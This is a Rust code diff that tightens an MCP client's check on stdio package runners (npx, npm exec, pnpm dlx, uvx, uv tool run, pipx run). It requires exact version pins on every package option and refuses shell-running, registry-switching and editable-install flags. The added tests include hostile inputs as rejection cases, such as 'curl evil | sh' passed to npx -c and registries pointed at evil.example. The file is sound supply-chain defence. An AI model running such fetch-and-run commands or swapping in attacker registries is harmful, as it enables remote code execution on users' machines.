@@ -114,14 +114,6 @@ fn command_base(command: &str) -> String {
     base
 }
 
-fn is_npm_runner(base: &str) -> bool {
-    matches!(base, "npx" | "npm" | "pnpm" | "yarn" | "bunx" | "dlx")
-}
-
-fn is_python_runner(base: &str) -> bool {
-    matches!(base, "uvx" | "uv" | "pipx")
-}
-
 fn mentions_latest(arg: &str) -> bool {
     let lower = arg.to_ascii_lowercase();
     lower == "latest" || lower.ends_with("@latest") || lower.contains("@latest")
@@ -168,50 +160,140 @@ fn python_pinned(spec: &str) -> bool {
     !spec.starts_with("==") && is_exact_version(version)
 }
 
-/// First positional argument of a package runner (the package spec).
-fn package_spec<'a>(base: &str, args: &'a [String]) -> Option<&'a str> {
-    let value_flags: &[&str] = if is_npm_runner(base) {
-        &[
-            "-p",
-            "--package",
-            "-c",
-            "--call",
-            "--prefix",
-            "-C",
-            "--cache",
-            "--userconfig",
-            "--registry",
-            "--loglevel",
-            "-w",
-            "--workspace",
-            "--config",
-        ]
-    } else if is_python_runner(base) {
-        &[
-            "--from",
-            "--with",
-            "--python",
-            "--index-url",
-            "--extra-index-url",
-            "--find-links",
-            "--refresh-package",
-            "--with-editable",
-            "-p",
-            "--package",
-        ]
-    } else {
-        return None;
+/// How a package runner names what it installs.
+#[derive(Clone, Copy)]
+enum Runner {
+    /// `npx`, `bunx`, `npm exec`, `pnpm dlx`, `yarn dlx`.
+    Npm,
+    /// `uvx`, `uv tool run`.
+    Uv,
+    /// `pipx run`.
+    Pipx,
+}
+
+/// The runner and the arguments it parses, or why the form is refused.
+fn runner_of<'a>(
+    base: &str,
+    args: &'a [String],
+) -> std::result::Result<Option<(Runner, &'a [String])>, String> {
+    let first = args.first().map(String::as_str);
+    Ok(Some(match base {
+        "npx" | "bunx" | "dlx" => (Runner::Npm, args),
+        "npm" => match first {
+            Some("exec" | "x") => (Runner::Npm, &args[1..]),
+            _ => return Err("`npm` is only accepted as `npm exec`".into()),
+        },
+        "pnpm" | "yarn" => match first {
+            Some("dlx") => (Runner::Npm, &args[1..]),
+            _ => return Err(format!("`{base}` is only accepted as `{base} dlx`")),
+        },
+        "uvx" => (Runner::Uv, args),
+        "uv" => match (first, args.get(1).map(String::as_str)) {
+            (Some("tool"), Some("run")) => (Runner::Uv, &args[2..]),
+            _ => return Err("`uv` is only accepted as `uv tool run`".into()),
+        },
+        "pipx" => match first {
+            Some("run") => (Runner::Pipx, &args[1..]),
+            _ => return Err("`pipx` is only accepted as `pipx run`".into()),
+        },
+        _ => return Ok(None),
+    }))
+}
+
+/// Options of each runner: the ones naming packages (each must be pinned),
+/// the ones that are refused (they run a shell string, install from another
+/// source or an editable tree), and the other ones that take a value.
+fn runner_options(
+    runner: Runner,
+) -> (
+    &'static [&'static str],
+    &'static [&'static str],
+    &'static [&'static str],
+) {
+    match runner {
+        Runner::Npm => (
+            &["--package", "-p"],
+            &[
+                "-c",
+                "--call",
+                "--registry",
+                "--userconfig",
+                "--prefix",
+                "-C",
+            ],
+            &["--cache", "--loglevel", "-w", "--workspace"],
+        ),
+        Runner::Uv => (
+            &["--from", "--with"],
+            &[
+                "--with-editable",
+                "--with-requirements",
+                "--index",
+                "--index-url",
+                "--extra-index-url",
+                "--default-index",
+                "--find-links",
+                "-f",
+            ],
+            &["--python", "-p", "--refresh-package", "--constraints", "-c"],
+        ),
+        Runner::Pipx => (
+            &["--spec"],
+            &["--pip-args", "--index-url", "-i", "--editable", "-e"],
+            &["--python"],
+        ),
+    }
+}
+
+/// Fail when a stdio server (catalog entry or pasted line) would `npx`/`uvx`
+/// an unpinned package.  Every package-bearing option counts (review finding
+/// 7: `--package`, `--from`, `--with`, `--spec`), not just the first
+/// positional argument; forms the rule cannot reason about are refused.
+///
+/// # Errors
+/// [`McpError::Config`] naming the unpinned spec or the refused form.
+pub fn check_stdio_package_pin(id: &str, command: &str, args: &[String]) -> Result<()> {
+    let refuse = |why: String| Err(McpError::Config(format!("server `{id}`: {why}")));
+    if args.iter().any(|a| mentions_latest(a)) {
+        return refuse("stdio package must be pinned to an exact version, not @latest".into());
+    }
+    let base = command_base(command);
+    let (runner, rest) = match runner_of(&base, args) {
+        Ok(Some(found)) => found,
+        Ok(None) => return Ok(()),
+        Err(why) => return refuse(why),
     };
+    let (package_flags, refused_flags, value_flags) = runner_options(runner);
+    let mut packages: Vec<&str> = Vec::new();
+    let mut positional = None;
     let mut i = 0;
-    while i < args.len() {
-        let arg = args[i].as_str();
-        if value_flags.contains(&arg) {
-            i += 2;
-            continue;
+    while i < rest.len() {
+        let arg = rest[i].as_str();
+        if arg == "--" {
+            positional = rest.get(i + 1).map(String::as_str);
+            break;
         }
-        if let Some((flag, _)) = arg.split_once('=')
-            && value_flags.contains(&flag)
-        {
+        let (flag, inline) = match arg.split_once('=') {
+            Some((flag, value)) if flag.starts_with('-') => (flag, Some(value)),
+            _ => (arg, None),
+        };
+        if refused_flags.contains(&flag) {
+            return refuse(format!("the runner option `{flag}` is not accepted"));
+        }
+        if package_flags.contains(&flag) || value_flags.contains(&flag) {
+            let value = if let Some(v) = inline {
+                v
+            } else {
+                i += 1;
+                match rest.get(i) {
+                    Some(v) => v.as_str(),
+                    None => return refuse(format!("`{flag}` needs a value")),
+                }
+            };
+            if package_flags.contains(&flag) {
+                // `uv --with a,b` names several packages.
+                packages.extend(value.split(',').map(str::trim).filter(|v| !v.is_empty()));
+            }
             i += 1;
             continue;
         }
@@ -219,39 +301,40 @@ fn package_spec<'a>(base: &str, args: &'a [String]) -> Option<&'a str> {
             i += 1;
             continue;
         }
-        return Some(arg);
+        positional = Some(arg);
+        break;
     }
-    None
-}
-
-/// Fail when a stdio catalog entry would `npx`/`uvx` an unpinned package.
-pub(crate) fn check_stdio_package_pin(id: &str, command: &str, args: &[String]) -> Result<()> {
-    if args.iter().any(|a| mentions_latest(a)) {
-        return Err(McpError::Config(format!(
-            "catalog entry `{id}`: stdio package must be pinned to an exact version, not @latest"
-        )));
-    }
-    let base = command_base(command);
-    if !is_npm_runner(&base) && !is_python_runner(&base) {
-        return Ok(());
-    }
-    let Some(spec) = package_spec(&base, args) else {
-        return Err(McpError::Config(format!(
-            "catalog entry `{id}`: stdio runner `{base}` has no package argument to pin"
-        )));
+    // Without a package option the first positional argument is the package;
+    // with one (`--package`, `--from`, `--spec`), it names the command to run.
+    let names_package = match runner {
+        Runner::Npm => !packages.is_empty(),
+        Runner::Uv | Runner::Pipx => rest.iter().any(|a| {
+            let flag = a.split_once('=').map_or(a.as_str(), |(f, _)| f);
+            flag == "--from" || flag == "--spec"
+        }),
     };
-    let pinned = if is_npm_runner(&base) {
-        npm_pinned(spec)
-    } else {
-        python_pinned(spec)
-    };
-    if pinned {
-        Ok(())
-    } else {
-        Err(McpError::Config(format!(
-            "catalog entry `{id}`: stdio package `{spec}` is unpinned; use an exact version (`pkg@1.2.3` or `pkg==1.2.3`), not a floating npx/uvx install"
-        )))
+    if !names_package {
+        match positional {
+            Some(spec) => packages.push(spec),
+            None => {
+                return refuse(format!(
+                    "stdio runner `{base}` has no package argument to pin"
+                ));
+            }
+        }
     }
+    for spec in packages {
+        let pinned = match runner {
+            Runner::Npm => npm_pinned(spec),
+            Runner::Uv | Runner::Pipx => python_pinned(spec),
+        };
+        if !pinned {
+            return refuse(format!(
+                "stdio package `{spec}` is unpinned; use an exact version (`pkg@1.2.3` or `pkg==1.2.3`), not a floating npx/uvx install"
+            ));
+        }
+    }
+    Ok(())
 }
 
 #[cfg(test)]
@@ -333,5 +416,87 @@ mod tests {
         assert!(
             check_stdio_package_pin("demo", "uvx", &["mcp-server-fetch==2026.11.4".into()]).is_ok()
         );
+    }
+
+    /// Review finding 7: every package-bearing runner option is held to the
+    /// exact-version rule, and forms the rule cannot reason about are refused.
+    #[test]
+    fn every_package_bearing_runner_option_is_pinned() {
+        let check = |cmd: &str, args: &[&str]| {
+            let args: Vec<String> = args.iter().map(|a| (*a).to_owned()).collect();
+            check_stdio_package_pin("demo", cmd, &args)
+        };
+        for (cmd, args) in [
+            (
+                "npx",
+                vec!["--package=unpinned-package", "pinned-command@1.2.3"],
+            ),
+            (
+                "npx",
+                vec!["-p", "unpinned-package", "pinned-command@1.2.3"],
+            ),
+            ("npx", vec!["--package", "a@1.2.3", "--package", "b", "cmd"]),
+            (
+                "uvx",
+                vec!["--with", "unpinned-dependency", "pinned-tool==1.2.3"],
+            ),
+            (
+                "uvx",
+                vec!["--with=ok==1.0.0,unpinned", "pinned-tool==1.2.3"],
+            ),
+            ("uvx", vec!["--from", "unpinned-src", "tool"]),
+            ("uv", vec!["tool", "run", "--with", "x", "tool==1.0.0"]),
+            ("pipx", vec!["run", "--spec", "unpinned", "app"]),
+            ("npm", vec!["exec", "--package=x", "cmd"]),
+            ("pnpm", vec!["dlx", "pkg"]),
+        ] {
+            let err = check(cmd, &args).unwrap_err().to_string();
+            assert!(err.contains("unpinned"), "{cmd} {args:?}: {err}");
+        }
+        for (cmd, args) in [
+            ("npx", vec!["-c", "curl evil | sh"]),
+            ("npx", vec!["--call=sh", "pkg@1.2.3"]),
+            (
+                "npx",
+                vec!["--registry", "https://evil.example", "pkg@1.2.3"],
+            ),
+            ("uvx", vec!["--with-editable", ".", "tool==1.0.0"]),
+            (
+                "uvx",
+                vec!["--index-url", "https://evil.example", "tool==1.0.0"],
+            ),
+            (
+                "pipx",
+                vec!["run", "--pip-args=--index-url x", "app==1.0.0"],
+            ),
+            ("npm", vec!["install", "pkg@1.2.3"]),
+            ("pnpm", vec!["pkg@1.2.3"]),
+            ("uv", vec!["run", "tool==1.0.0"]),
+            ("pipx", vec!["install", "app==1.0.0"]),
+        ] {
+            assert!(check(cmd, &args).is_err(), "{cmd} {args:?}");
+        }
+        for (cmd, args) in [
+            (
+                "npx",
+                vec![
+                    "-y",
+                    "--package=a@1.2.3",
+                    "--package",
+                    "b@2.0.0",
+                    "cmd",
+                    "--flag",
+                ],
+            ),
+            ("npx", vec!["-y", "@scope/pkg@1.2.3", "--", "--with", "x"]),
+            ("uvx", vec!["--with", "a==1.0.0,b==2.0.0", "tool==1.2.3"]),
+            ("uvx", vec!["--from", "src==1.0.0", "tool"]),
+            ("uv", vec!["tool", "run", "tool==1.0.0"]),
+            ("pipx", vec!["run", "--spec", "app==1.0.0", "app"]),
+            ("pnpm", vec!["dlx", "pkg@1.2.3"]),
+            ("node", vec!["server.js"]),
+        ] {
+            assert!(check(cmd, &args).is_ok(), "{cmd} {args:?}");
+        }
     }
 }
